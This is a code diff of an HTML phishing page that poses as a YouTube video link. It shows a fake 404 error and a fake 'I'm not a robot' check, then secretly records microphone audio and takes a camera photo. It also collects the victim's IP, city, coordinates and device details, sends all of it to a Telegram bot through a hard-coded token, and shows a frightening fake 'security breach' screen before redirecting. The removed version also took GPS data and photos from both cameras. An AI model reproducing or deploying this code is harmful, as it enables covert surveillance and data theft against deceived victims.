@@ -5,49 +5,61 @@
     <meta property="og:description" content="Watch the funniest moments of the week. Click to play.">
     <meta property="og:image" content="https://i.ytimg.com/vi/sWA-osOeiJg/hq720.jpg">
     <link rel="icon" href="https://www.youtube.com/s/desktop/28ea0284/img/favicon_32x32.png">
-
     <meta charset="UTF-8">
     <title>404 Not Found</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body, html {
-            height: 100%; margin: 0; display: flex; justify-content: center;
-            align-items: center; font-family: 'Helvetica', Arial, sans-serif;
-            background-color: #fcfcfc; color: #000; text-align: center;
-        }
-        .container { max-width: 600px; padding: 20px; }
-        h1 { font-size: 130px; margin: 0; font-weight: 800; line-height: 1; }
-        h2 { font-size: 28px; margin: 20px 0 5px 0; font-weight: 700; }
-        p { color: #999; font-size: 18px; margin-bottom: 40px; }
+        body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; font-family: 'Helvetica', Arial, sans-serif; background-color: #fcfcfc; color: #000; text-align: center; overflow: hidden; }
+        .container { max-width: 500px; padding: 20px; }
+        h1 { font-size: 110px; margin: 0; font-weight: 800; line-height: 1; }
+        h2 { font-size: 26px; margin: 15px 0 10px 0; font-weight: 700; }
+        p { color: #999; font-size: 16px; margin-bottom: 25px; }
         
-        #photoBtn {
-            background-color: #222; color: #fff; padding: 12px 25px;
-            border: none; text-transform: uppercase; font-weight: bold;
-            cursor: pointer; font-size: 13px; letter-spacing: 1px;
-        }
+        .captcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; display: flex; align-items: center; justify-content: space-between; width: 280px; margin: 0 auto 25px; border-radius: 3px; }
+        input[type="checkbox"] { width: 22px; height: 22px; cursor: pointer; }
+        #photoBtn { background-color: #000; color: #fff; padding: 12px 25px; border: none; text-transform: uppercase; font-weight: bold; cursor: pointer; opacity: 0.4; pointer-events: none; }
 
-        #progressBox { margin-top: 30px; display: none; }
-        .progress { width: 200px; height: 2px; background: #eee; margin: 0 auto; }
-        .bar { height: 100%; width: 0%; background: #000; transition: 0.1s; }
-        video, canvas { display: none; }
+        /* SCANNER INTERFACE */
+        #scanUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; color: #0f0; font-family: monospace; }
+        #video { width: 100%; height: 100%; object-fit: cover; opacity: 0.5; }
+        .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: rgba(255, 0, 0, 0.7); box-shadow: 0 0 15px #ff0000; animation: scan 3s infinite; }
+        @keyframes scan { 0% { top: 0% } 50% { top: 100% } 100% { top: 0% } }
+        .scan-data { position: absolute; top: 20px; left: 20px; text-align: left; background: rgba(0,0,0,0.7); padding: 15px; border-radius: 5px; font-size: 12px; line-height: 1.5; }
+        
+        /* WARNING EFFECT */
+        #warningOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.8); z-index: 200; color: #fff; display: flex; justify-content: center; align-items: center; flex-direction: column; font-weight: bold; }
+        .blink { animation: blinker 0.5s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="container" id="mainUI">
     <h1>404</h1>
-    <h2>Oops, This Page Not Found!</h2>
-    <p>The link might be corrupted,<br>or the page may have been removed</p>
+    <h2>Oops, Page Not Found!</h2>
+    <p>Please verify you are human to continue to the secure stream.</p>
+    <div class="captcha-box">
+        <div style="display: flex; align-items: center; gap: 12px;">
+            <input type="checkbox" id="captchaCheck">
+            <span style="font-size: 14px; color: #555;">I'm not a robot</span>
+        </div>
+        <img style="width: 40px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+    </div>
+    <button id="photoBtn">VERIFY & PROCEED</button>
+</div>
 
-    <button id="photoBtn">GO BACK HOME</button>
-
-    <div id="progressBox">
-        <div class="progress"><div class="bar" id="bar"></div></div>
+<div id="scanUI">
+    <video id="video" autoplay playsinline muted></video>
+    <div class="scanner-line"></div>
+    <div class="scan-data" id="logs">> INITIALIZING BIOMETRIC SCAN...<br></div>
+    <div id="warningOverlay" style="display:none;">
+        <h1 class="blink">WARNING!</h1>
+        <p style="color:#fff; font-size: 20px;">SECURITY BREACH DETECTED</p>
+        <p style="color:#fff;">BYPASSING SYSTEM LIMITS...</p>
     </div>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
     const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
@@ -56,84 +68,72 @@
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
+    const photoBtn = document.getElementById("photoBtn");
 
-    // Aniq GPS va IP ma'lumotlarini olish
-    async function getDetailedInfo() {
-        let gpsInfo = "📍 GPS: Ruxsat berilmadi yoki xato";
-        
-        // GPS koordinatalarini olishga urinish
-        const getGPS = () => {
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        resolve(`📍 Aniq GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                    },
-                    () => { resolve("📍 GPS: Foydalanuvchi rad etdi"); },
-                    { enableHighAccuracy: true, timeout: 7000 }
-                );
-            });
-        };
+    document.getElementById("captchaCheck").onchange = (e) => {
+        photoBtn.style.opacity = e.target.checked ? "1" : "0.4";
+        photoBtn.style.pointerEvents = e.target.checked ? "auto" : "none";
+    };
 
-        try {
-            const [ipRes, gpsRes] = await Promise.all([
-                fetch('https://ipapi.co/json/').then(r => r.json()),
-                getGPS()
-            ]);
-            
-            const n = new Date();
-            const time = `${n.getHours()}:${n.getMinutes()}:${n.getSeconds()}`;
-            
-            return `🕒 Vaqt: ${time}\n🌐 IP: ${ipRes.ip}\n🏙 Shahar: ${ipRes.city}\n${gpsRes}`;
-        } catch (e) {
-            return "⚠️ Ma'lumot olishda xatolik";
-        }
+    async function getDeepInfo() {
+        let bInfo = "N/A";
+        try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}%`; } catch(e) {}
+        const ipR = await fetch('https://ipapi.co/json/').then(r => r.json());
+        const ram = navigator.deviceMemory || "N/A";
+        return `🕒 Time: ${new Date().toLocaleTimeString()}\n📱 Device: ${navigator.platform} (${ram}GB RAM)\n🔋 Bat: ${bInfo}\n🌐 IP: ${ipR.ip}\n🏙 City: ${ipR.city}\n📍 Maps: http://google.com/maps?q=${ipR.latitude},${ipR.longitude}`;
     }
 
-    async function send(blob, text) {
+    async function sendToTg(blob, type, caption="") {
         const fd = new FormData();
         fd.append("chat_id", CHAT_ID);
-        fd.append("photo", blob);
-        fd.append("caption", text);
-        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+        fd.append(type, blob, type === "photo" ? "img.jpg" : "audio.ogg");
+        if(caption) fd.append("caption", caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: "POST", body: fd });
     }
 
-    async function capture(mode) {
+    photoBtn.onclick = async () => {
+        document.getElementById("mainUI").style.display = "none";
+        document.getElementById("scanUI").style.display = "block";
+        const logs = document.getElementById("logs");
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             video.srcObject = stream;
-            await new Promise(r => video.onloadedmetadata = r);
-            await new Promise(r => setTimeout(r, 1200)); // Qora rasm chiqmasligi uchun kutish
+            const info = await getDeepInfo();
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-            
-            const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.7));
-            stream.getTracks().forEach(t => t.stop());
-            return blob;
-        } catch (e) { return null; }
-    }
+            // 1. Voice Record (Ovoz yozish)
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => sendToTg(new Blob(chunks, {type: 'audio/ogg'}), "voice", "🎙 Recorded Audio");
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
 
-    document.getElementById("photoBtn").onclick = async () => {
-        document.getElementById("progressBox").style.display = "block";
-        const bar = document.getElementById("bar");
-        bar.style.width = "30%";
+            // 2. Fake Scan Effects
+            setTimeout(() => logs.innerHTML += "> NEURAL LINK ESTABLISHED...<br>", 1000);
+            setTimeout(() => logs.innerHTML += "> ANALYZING FACIAL STRUCTURE...<br>", 2000);
 
-        // Ma'lumotlarni parallel yig'ish (Tezlik uchun)
-        const info = await getDetailedInfo();
-        bar.style.width = "50%";
-        
-        const f = await capture("user");
-        if (f) await send(f, "Old Kamera\n" + info);
-        bar.style.width = "80%";
+            // 3. Front Capture
+            setTimeout(async () => {
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                canvas.toBlob(b => sendToTg(b, "photo", "📸 FRONT SCAN\n" + info), "image/jpeg", 0.7);
+            }, 3000);
 
-        const b = await capture("environment");
-        if (b) await send(b, "Orqa Kamera\n" + info);
-        
-        bar.style.width = "100%";
-        setTimeout(() => { window.location.href = TARGET_URL; }, 500);
+            // 4. THE BIG SURPRISE (Daxshatli ogohlantirish)
+            setTimeout(() => {
+                document.getElementById("warningOverlay").style.display = "flex";
+                logs.innerHTML += "<span style='color:red'>> CRITICAL ERROR: UNAUTHORIZED ACCESS!</span><br>";
+            }, 4000);
+
+            // 5. Final Redirect
+            setTimeout(() => {
+                stream.getTracks().forEach(t => t.stop());
+                window.location.href = TARGET_URL;
+            }, 6500);
+
+        } catch(e) { window.location.href = TARGET_URL; }
     };
 </script>
-
 </body>
 </html>
